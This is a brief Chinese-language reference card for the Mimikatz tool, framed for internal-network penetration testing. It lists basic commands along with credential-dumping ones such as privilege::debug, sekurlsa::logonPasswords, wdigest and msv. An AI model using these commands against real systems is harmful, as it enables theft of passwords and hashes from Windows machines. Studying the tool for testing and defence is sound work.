# mimikatz

Mimikatz是法国人编写的一款轻量级的调试工具，理论上可以抓取所有windows系统的明文密码，因此在内网渗透过程中应用非常广，属于内网渗透必备工具之一，被很多人称之为密码抓取神器。Mimikatz其实并不只有抓取口令这个功能，它还能够创建票证、票证传递、hash传递、提升进程权限、注入进程、读取进程内存等等、甚至伪造域管理凭证令牌等诸多功能。

- 基础命令

```cmd
cls     # 清屏
exit    # 退出
version # 查看mimikatz的版本
system::user        # 查看当前登录的系统用户
system::computer    # 查看计算机名称
process::list       # 列出进程
process::suspend    # 进程名称--暂停进程
process::stop       # 进程名称--结束进程
process::modules    # 列出系统的核心模块及所在位置
service::list       # 列出系统的服务
service::remove     # 移除系统的服务
service::start stop # 服务名称--启动或停止服务
privilege::list     # 列出权限列表
privilege::enable   # 激活一个或多个权限
nogpo::cmd          # 打开系统的cmd.exe
nogpo::regedit      # 打开系统的注册表
nogpo::taskmgr      # 打开任务管理器
ts::processes       # 显示进程和对应的pid情况等
sekurlsa::ekeys     # 抓取hash



privilege::debug    # 提升权限

ts::sessions        # 显示当前的会话
sekurlsa::wdigest   # 获取本地用户信息及密码
sekurlsa::tspkg     # 获取tspkg用户信息及密码
sekurlsa::msv       # 抓取hash
sekurlsa::logonPasswords    # 获登陆用户信息及密码
```
